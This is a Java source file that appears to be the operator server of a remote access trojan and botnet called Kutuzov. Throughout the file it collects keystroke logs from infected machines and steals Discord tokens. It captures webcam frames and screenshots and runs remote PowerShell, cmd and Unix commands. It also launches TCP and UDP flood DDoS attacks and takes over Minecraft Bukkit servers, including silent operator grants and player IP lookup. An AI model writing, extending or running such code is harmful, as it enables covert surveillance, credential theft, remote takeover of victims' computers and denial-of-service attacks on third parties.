package me.kutuzov.server;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.stream.JsonReader;
import com.sun.imageio.plugins.common.ImageUtil;
import jdk.nashorn.internal.ir.annotations.Ignore;
import me.kutuzov.packet.*;
import me.kutuzov.packet.bukkit.*;
import me.kutuzov.packet.logger.*;
import me.kutuzov.packet.logger.types.TokenType;
import me.kutuzov.server.client.Client;
import me.kutuzov.server.client.ClientManager;
import me.kutuzov.server.kftp.KFTPPanel;
import me.kutuzov.server.util.LoadingWheel;
import me.kutuzov.utils.ImageUtils;
import me.pk2.moodlyencryption.MoodlyEncryption;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeFormatterBuilder;
import java.util.Date;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import static me.kutuzov.server.KutuzovEnvironment.*;
import static me.kutuzov.server.util.ConsoleUtils.*;

public class KutuzovServer {
    public final ClientManager clientManager;
    private final LoadingWheel loadingWheel;
    private ServerSocket serverSocket;
    private Thread thread, checkThreadLoop, writerLoop;

    public KutuzovServer() {
        this.loadingWheel = new LoadingWheel();
        this.clientManager = new ClientManager();
    }

    public void boot() {
        JsonObject config = new JsonObject();
        config.addProperty("port", PORT);

        File cfile = new File("config.json");
        if(!cfile.exists()) {
            PrintWriter pw = null;
            try {
                pw = new PrintWriter(cfile);
                pw.write(config.toString());
                pw.flush();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } finally {
                if(pw != null)
                    pw.close();
            }
        } else {
            try {
                BufferedReader br = new BufferedReader(new FileReader(cfile));
                StringBuilder sb = new StringBuilder();
                String line;
                while((line = br.readLine()) != null) {
                    sb.append(line);
                }
                br.close();
                config = new Gson().fromJson(sb.toString(), JsonObject.class);
                PORT = config.get("port").getAsInt();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        loadingWheel.status.set("Booting server...");
        loadingWheel.showing.set(true);

        try {
            serverSocket = new ServerSocket(PORT);
        } catch (IOException exception) {
            loadingWheel.status.set("Failed to boot server!");
            loadingWheel.showing.set(false);
            exception.printStackTrace();

            return;
        }

        thread = new Thread(() -> {
            while(true) {
                Socket clientSocket;
                try {
                    clientSocket = serverSocket.accept();
                } catch (IOException exception) {
                    exception.printStackTrace();
                    continue;
                }

                Client client = clientManager.newClient(clientSocket);
                try {
                    client.sendPacket(new SCRequireHandshakePacket());
                    CSHandshakePacket handshakePacket = (CSHandshakePacket)client.readPacket();
                    client.setIdentifierName(handshakePacket.identifierName);
                    client.setOs(handshakePacket.os);
                    client.setLocalIp(handshakePacket.localIp);
                    client.setVersion(handshakePacket.version);
                    client.setMC(handshakePacket.isMC);
                } catch (IOException e) {
                    pnl("Could not request handshake from client(" + client.getIp() + ")!");
                }
            }
        });
        thread.start();

        checkThreadLoop = new Thread(() -> {
            while(true) {
                trySleep(5000);
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            entry.getValue().sendPacket(new SCKeepAlivePacket());
                        } catch (Exception e) {
                            clientManager.clients.remove(entry.getKey());
                            // pnl("Client disconnected(" + clientManager.clients.size() + "): " + entry.getKey());
                        }});
            }
        });
        checkThreadLoop.start();

        // SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy");
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("d-M-yyyy");

        writerLoop = new Thread(() -> {
            while (true) {
                trySleep(61000);

                String date = LocalDateTime.now().format(formatter);
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        if(!entry.getValue().getVersion().contentEquals(VERSION))
                            return;

                        try {
                            if(!entry.getValue().getConnection().isConnected())
                                return;
                            entry.getValue().sendPacket(new SCAskWriterPacket());
                            CSWriterPacket wPacket = (CSWriterPacket)entry.getValue().readPacket();

                            File file = new File("keylog/" + entry.getValue().getIdentifierName() + "/" + entry.getValue().getIp().split(":")[0] + "_" + entry.getValue().getLocalIp() + "/" + date + ".log");
                            file.getParentFile().mkdirs();
                            if(!file.exists())
                                file.createNewFile();

                            FileOutputStream writer = new FileOutputStream(file.getPath(), true);
                            writer.write((wPacket.text + "\r\n").getBytes(StandardCharsets.UTF_8));
                            writer.close();
                        } catch (Exception e) {}});
            }
        });
        writerLoop.start();

        trySleep(1000);
        loadingWheel.showing.set(false);
        trySleep(1000);
        clearConsole();
        pnl("Booting server... OK!");
        pnl("Listening on " + serverSocket.getInetAddress().getHostAddress() + ":" + serverSocket.getLocalPort());
        trySleep(3000);
        menu();
    }

    private void packet_csda_send(String data, Client client) {
        try {
            client.sendPacket(new SCDAPacket(data));

            CSDAResPacket resPacket = (CSDAResPacket) client.readPacket();

            switch (resPacket.response) {
                case CSDAResPacket.RESPONSE_OK:
                    pnl("Sent to " + client.getFormattedIdentifierName());
                    break;
                case CSDAResPacket.RESPONSE_ERROR:
                    pnl("Error sending to " + client.getFormattedIdentifierName());
                    break;
                case CSDAResPacket.RESPONSE_BUSY:
                    pnl(client.getFormattedIdentifierName() + " is busy!");
                    break;
            }
        } catch (Exception e) { pnl("Failed to send data to " + client.getFormattedIdentifierName() + "! (" + e.getMessage() + ")"); }
    }

    private void packet_csda(String data, Client client) {
        try {
            MoodlyEncryption encryption = new MoodlyEncryption();
            String key = encryption.getKey();
            String encryptedData = new String(encryption.encrypt(data)) + key;

            if(client == null)
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> packet_csda_send(encryptedData, entry.getValue()));
            else asyncRun(() -> packet_csda_send(encryptedData, client));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void dos_options() {
        clearConsole();
        pnl("DDOS options:");
        pnl("  0) Back");
        pnl("  1) TCP Flood");
        pnl("  2) UDP Flood");
        // pnl("  3. HTTP Flood");
        pnl("");
        pwl("Select option: ");

        String line = readLine();
        int option = line.contentEquals("0") ? 0 : Integer.parseInt(line);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("TCP Flood attack:");
                pnl("Please enter the IP address of the target: ");
                pwl("IP=");
                String ip = readLine();

                pnl("Please enter the port of the target: ");
                pwl("Port=");
                int port = Integer.parseInt(readLine());

                pnl("Please enter the amount of threads: ");
                pwl("Threads=");
                int threads = Integer.parseInt(readLine());

                pnl("Please enter the amount of time: ");
                pwl("Time(s)=");
                int time = Integer.parseInt(readLine())*1000;

                String data = String.format("tcp;%s;%s;%s;%s", ip, port, threads, time);

                packet_csda(data, null);
            } break;
            case 2: {
                clearConsole();
                pnl("UDP Flood attack:");
                pnl("Please enter the IP address of the target: ");
                pwl(" IP=");
                String ip = readLine();

                pnl("Please enter the port of the target: ");
                pwl(" Port=");
                int port = Integer.parseInt(readLine());

                pnl("Please enter the amount of threads: ");
                pwl(" Threads=");
                int threads = Integer.parseInt(readLine());

                pnl("Please enter the amount of time: ");
                pwl(" Time(s)=");
                int time = Integer.parseInt(readLine())*1000;

                String data = String.format("udp;%s;%s;%s;%s", ip, port, threads, time);

                packet_csda(data, null);
            } break;
            /*case 3: {

            } break;*/
            case 0: return;
            default:
                dos_options();
                break;
        }
    }

    private void user_list_client_dos_options(Client client) {
        clearConsole();
        pnl("Client DOS options:");
        pnl("  0) Back");
        pnl("  1) TCP Flood");
        pnl("  2) UDP Flood");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        clearConsole();
        switch (option) {

            case 1:
            case 2: {
                String protocol = option == 1? "tcp" : "udp";
                pnl(protocol.toUpperCase(Locale.ROOT) + " Flood attack:");

                pnl("Please enter the IP address of the target: ");
                pwl("IP=");
                String ip = readLine();

                pnl("Please enter the port of the target: ");
                pwl("Port=");
                int port = Integer.parseInt(readLine());

                pnl("Please enter the amount of threads: ");
                pwl("Threads=");
                int threads = Integer.parseInt(readLine());

                pnl("Please enter the amount of time: ");
                pwl("Time(s)=");
                int time = Integer.parseInt(readLine())*1000;

                String data = String.format(protocol + ";%s;%s;%s;%s", ip, port, threads, time);

                packet_csda(data, client);
            } break;

            case 0: return;
            default:
                user_list_client_dos_options(client);
                break;
        }
    }

    private void user_list_client_logger(Client client) {
        clearConsole();
        pnl("Client Logger Options:");
        pnl("  0) Back");
        pnl("  1) Discord Token");
        pnl("  2) Webcam Capture");
        pnl("  3) Screenshot");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        clearConsole();

        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("d-M-yyyy_HH-mm-ss");
        String date = LocalDateTime.now().format(formatter);

        File file = new File("captures/" + client.getIdentifierName() + "/" + client.getIp().split(":")[0] + "_" + client.getLocalIp() + "/" + date + ".png");
        file.getParentFile().mkdirs();

        switch (option) {
            case 1: {
                try {
                    client.sendPacket(new SCTokenRequest(TokenType.DISCORD));
                } catch(Exception exception) {
                    exception.printStackTrace();
                    pnl("Could not send SCTokenRequest packet with type DISCORD.");

                    trySleep(5000);
                    break;
                }

                CSTokenResponse response = (CSTokenResponse) client.readPacket();
                if(response.type != TokenType.DISCORD)
                    pnl("WARNING! The received token is not a DISCORD token, is a " + response.type.name() + " token!");

                pnl("Received token(s)<" + response.tokens.length + ">:");
                for(int i = 0; i < response.tokens.length; i++)
                    pnl("  - " + response.tokens[i]);
                pnl("Press any key to continue.");
                readLine();
            } break;

            case 2: {
                try {
                    client.sendPacket(new SCWebcamList());
                } catch (Exception e) {
                    e.printStackTrace();
                    pnl("Could not send SCWebcamList packet.");

                    trySleep(5000);
                }

                pnl("Waiting for CSWebcamList...");

                CSWebcamList list = (CSWebcamList) client.readPacket();
                pnl("Received webcam list with " + list.webcamNames.length + " webcams.");
                pnl("Please select a webcam: ");
                for(int i = 0; i < list.webcamNames.length; i++)
                    pnl("  " + i + ") " + list.webcamNames[i]);

                pwl("Webcam: ");
                int webcam = Integer.parseInt(readLine());
                pnl("Selected webcam: " + list.webcamNames[webcam]);

                try {
                    client.sendPacket(new SCWebcamFrame(webcam));
                } catch (Exception e) {
                    e.printStackTrace();
                    pnl("Could not send SCWebcamFrame packet.");

                    trySleep(5000);
                }

                pnl("Waiting for CSWebcamFrame...");

                CSWebcamFrame frame = (CSWebcamFrame) client.readPacket();
                pnl("Received frame with size " + frame.bytes.length + " bytes.");
                pnl("Converting to image...");

                try {
                    BufferedImage image = ImageUtils.toBufferedImage(frame.bytes);
                    ImageIO.write(image, "png", file);

                    pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
                } catch (IOException e) {
                    e.printStackTrace();
                    pnl("Could not convert frame to image.");

                    trySleep(5000);
                }

                pnl("Press any key to continue.");
                readLine();
            } break;

            case 3: {
                try {
                    client.sendPacket(new SCScreenFrame());
                } catch (Exception e) {
                    e.printStackTrace();
                    pnl("Could not send SCScreenFrame packet.");

                    trySleep(5000);
                }

                pnl("Waiting for CSScreenFrame...");

                CSScreenFrame frame = (CSScreenFrame) client.readPacket();
                pnl("Received frame with size " + frame.data.length + " bytes.");
                pnl("Converting to image...");

                try {
                    BufferedImage image = ImageUtils.toBufferedImage(frame.data);
                    ImageIO.write(image, "png", file);

                    pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
                } catch (IOException e) {
                    e.printStackTrace();
                    pnl("Could not convert frame to image.");

                    trySleep(5000);
                }

                pnl("Press any key to continue.");
                readLine();
            } break;

            case 0: return;
            default:
                break;
        }
    }

    private void user_list_header(Client client) {
        pnl("CLIENT VERSION: " + client.getVersion());
        pnl("ID: " + client.getIdentifierName());
        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
        pnl("OS: " + client.getOs());
        pnl("LocalIP: " + client.getLocalIp());
        pnl("IsMC: " + client._isMC());
    }

    private void user_list_client_windows(Client client) {
        clearConsole();
        user_list_header(client);
        pnl("Windows Client Options: ");
        pnl("  0) Go back");
        pnl("  1) Epilepsy");
        pnl("  2) Powershell");
        pnl("  3) Execute cmd command");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("Please enter the amount of time(ms):");
                pwl("Time(ms): ");
                int time = Integer.parseInt(readLine());
                try {
                    client.sendPacket(new SCEpilepsyPacket(time));
                } catch (IOException exception) {
                    pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 2: {
                clearConsole();
                pwl("Command: ");
                String command = readLine();
                try {
                    client.sendPacket(new SCPowershellCommandPacket(command));
                    Packet packet = null;
                    while(packet == null || !(packet instanceof CSPowershellResponsePacket)) {
                        try {
                            packet = (Packet) client.readPacket();
                        } catch (Exception exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            break;
                        }
                    }

                    if(packet == null)
                        return;
                    CSPowershellResponsePacket responsePacket = (CSPowershellResponsePacket)packet;
                    String response = responsePacket.response;
                    pnl("Response: \n  " + response);
                    readLine();
                } catch (IOException exception) {
                    pnl("Failed to send powershell command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    exception.printStackTrace();
                    readLine();
                }
            } break;

            case 3: {
                clearConsole();
                pwl("Command: ");
                String command = readLine();
                try {
                    client.sendPacket(new SCWinCommandPacket(command));
                    Packet packet = null;
                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
                        try {
                            packet = (Packet) client.readPacket();
                        } catch (Exception exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            break;
                        }
                    }

                    if(packet == null)
                        return;
                    CSWinCommandResponsePacket responsePacket = (CSWinCommandResponsePacket)packet;
                    String response = responsePacket.response;
                    pnl("Response: \n  " + response);
                    readLine();
                } catch (IOException exception) {
                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 0:
                return;
            default: break;
        }
    }

    private void user_list_client_unix(Client client) {
        clearConsole();
        user_list_header(client);
        pnl("Unix Client Options: ");
        pnl("  0) Go back");
        pnl("  1) Execute command");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pwl("Command: ");
                String command = readLine();
                try {
                    client.sendPacket(new SCUnixCommandPacket(command));
                    Packet packet = null;
                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
                        try {
                            packet = (Packet) client.readPacket();
                        } catch (Exception exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            break;
                        }
                    }

                    if(packet == null)
                        return;
                    CSUnixCommandResponsePacket responsePacket = (CSUnixCommandResponsePacket)packet;
                    String response = responsePacket.response;
                    pnl("Response: \n  " + response);
                    readLine();
                } catch (Exception exception) {
                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 0:
                return;
            default: break;
        }
    }

    private void user_list_client_bukkit(Client client) {
        clearConsole();

        CSBukkitInfo info = null;
        try {
            client.sendPacket(new SCBukkitInfo());
            Packet packet = null;
            while(!(packet instanceof CSBukkitInfo)) {
                try {
                    packet = (Packet) client.readPacket();
                } catch (Exception exception) {
                    pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                    return;
                }
            }

            info = (CSBukkitInfo)packet;
        }catch (IOException exception) {
            exception.printStackTrace();
            return;
        }

        user_list_header(client);
        pnl("Bukkit Version: " + info.VERSION);
        pnl("Bukkit Port: " + info.PORT);
        pnl("Options: ");
        pnl("  0) Go back");
        pnl("  1) Send console command");
        pnl("  2) Send command as player");
        pnl("  3) Send message as player");
        pnl("  4) Silent OP");
        pnl("  5) Silent Gamemode");
        pnl("  6) Get player ip");
        pnl("  7) Show plugin list");
        pnl("  8) Load plugin jar");
        pnl("  9) Enable plugin");
        pnl("  10) Disable plugin");
        pwl("Option: ");
        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("Please input the desired command: ");
                pwl("Command: ");

                String command = readLine();

                try {
                    client.sendPacket(new SCBukkitCommand(command));
                    pnl("Command sent!");
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 2: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                pnl("Please input the desired command: ");
                pwl("Command: ");

                String command = readLine();

                try {
                    client.sendPacket(new SCBukkitPlayerCommand(player, command));
                    pnl("Command sent!");
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 3: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                pnl("Please input the desired message: ");
                pwl("Message: ");

                String message = readLine();

                try {
                    client.sendPacket(new SCBukkitPlayerChat(player, message));
                    pnl("Message sent!");
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 4: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                try {
                    client.sendPacket(new SCBukkitOperator(player));
                } catch (IOException exception) { exception.printStackTrace(); }
            } break;

            case 5: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                pnl("Please input the new gamemode(0-3): ");
                pwl("Gamemode: ");

                int gamemode = Integer.parseInt(readLine());

                try {
                    client.sendPacket(new SCBukkitGamemode(player, gamemode));
                } catch (IOException exception) { exception.printStackTrace(); }
            } break;

            case 6: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                try {
                    client.sendPacket(new SCBukkitPlayerAddress(player));

                    Packet packet = null;
                    while(!(packet instanceof CSBukkitPlayerAddress)) {
                        try {
                            packet = (Packet) client.readPacket();
                        } catch (Exception exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            return;
                        }
                    }

                    CSBukkitPlayerAddress bukkitPlayerAddress = (CSBukkitPlayerAddress)packet;
                    pnl(player + "'s address is: " + bukkitPlayerAddress.address);
                    readLine();
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 7: {
                clearConsole();
                pnl("Obtaining plugin list...");

                try {
                    client.sendPacket(new SCBukkitPluginList());

                    Packet packet = null;
                    while(!(packet instanceof CSBukkitPluginList)) {
                        try {
                            packet = (Packet)client.readPacket();
                        } catch (Exception exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            return;
                        }
                    }

                    CSBukkitPluginList pluginList = (CSBukkitPluginList)packet;
                    String pluginString = String.join(", ", pluginList.plugins);
                    pnl("Plugins: " + pluginString);
                    readLine();
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 8: {
                clearConsole();

                pnl("Please input the desired plugin file:");
                pwl("File: ");
                String file = readLine();

                try {
                    client.sendPacket(new SCBukkitLoadPlugin(file));
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 9: {
                clearConsole();

                pnl("Please input the desired plugin name:");
                pwl("Plugin: ");
                String plugin = readLine();

                try {
                    client.sendPacket(new SCBukkitEnablePlugin(plugin));
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 10: {
                clearConsole();

                pnl("Please input the desired plugin name:");
                pwl("Plugin: ");
                String plugin = readLine();

                try {
                    client.sendPacket(new SCBukkitDisablePlugin(plugin));
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 0:
                user_list_client(client);
                break;
            default:
                break;
        }

        user_list_client_bukkit(client);
    }

    private void user_list_client(Client client) {
        clearConsole();
        user_list_header(client);
        pnl("Options: ");
        pnl("  0) Go back");
        pnl("  1) Send message");
        pnl("  2) DOS options");
        pnl("  3) Logger options");
        pnl("  4) Windows only options");
        pnl("  5) Beep");
        pnl("  6) KFTP(Kutuzov's File Transfer Protocol)");
        pnl("  7) Unix only options");
        pnl("  8) Bukkit only options");
        pwl("Option: ");
        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("Please enter the title of the messagebox: ");
                pwl("Title: ");
                String title = readLine();

                pnl("Please enter the message: ");
                pwl("Content: ");
                String content = readLine();

                pnl("Please enter the amount of messageboxes: ");
                pwl("Amount: ");
                int amount = Integer.parseInt(readLine());

                try {
                    client.sendPacket(new SCMessageBoxPacket(title, content, amount));
                } catch (Exception e) {
                    pnl("Failed to send message! (" + e.getMessage() + ")");
                    readLine();
                }
            } break;

            case 2:
                user_list_client_dos_options(client);
                break;

            case 3:
                user_list_client_logger(client);
                break;

            case 4:
                user_list_client_windows(client);
                break;

            case 5: {
                try {
                    client.sendPacket(new SCBeepPacket());
                } catch (IOException exception) {
                    pnl("Failed to send beep to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 6:
                KFTPPanel.panel_entry(client);
                break;

            case 7:
                user_list_client_unix(client);
                break;

            case 8:
                user_list_client_bukkit(client);
                break;

            case 0:
                menu();
                return;
            default: break;
        }

        user_list_client(client);
    }

    private void user_list() {
        clearConsole();
        pnl("User list(" + clientManager.clients.size() + "):");
        for(Map.Entry<String, Client> entry : clientManager.clients.entrySet())
            pnl(" - " + entry.getValue().getFormattedIdentifierName());
        pwl("Select user(0 to go back): ");
        String input = readLine();
        if(input.equals("0"))
            return;

        Client client = clientManager.findClient(input);
        if(client == null) {
            pnl("User not found!");
            user_list();
            return;
        }

        user_list_client(client);
    }



    private void menu() {
        clearConsole();
        pnl("Connected clients: " + clientManager.clients.size());
        pnl("Select action:");
        pnl("  0) Refresh");
        pnl("  1) MessageBox all clients");
        pnl("  2) DDOS options");
        pnl("  3) User list");
        pnl("  4) Beep all");
        pnl("  9) Stop server & exit");
        pnl("");
        pwl("Select action: ");

        String line = readLine();
        int option = line.contentEquals("")?0:Integer.parseInt(line);
        switch (option) {
            case 1:
                clearConsole();
                pnl("Please enter the title of the message box:");
                pwl("Title: ");
                String title = readLine();

                pnl("Please enter the content of the message box:");
                pwl("Enter the content: ");
                String content = readLine();

                pnl("Please enter the amount of message boxes:");
                pwl("Enter the amount: ");
                int amount = Integer.parseInt(readLine());

                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            entry.getValue().sendPacket(new SCMessageBoxPacket(title, content, amount));
                        } catch (Exception e) { e.printStackTrace(); }});
                menu();
                break;
            case 2:
                dos_options();
                menu();
                break;
            case 3:
                user_list();
                menu();
                break;
            case 4:
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            entry.getValue().sendPacket(new SCBeepPacket());
                        } catch (Exception e) { e.printStackTrace(); }});
                menu();
                break;

            case 9:
                System.exit(0);
                break;
            case 0:
            default: menu();
        }
    }
}
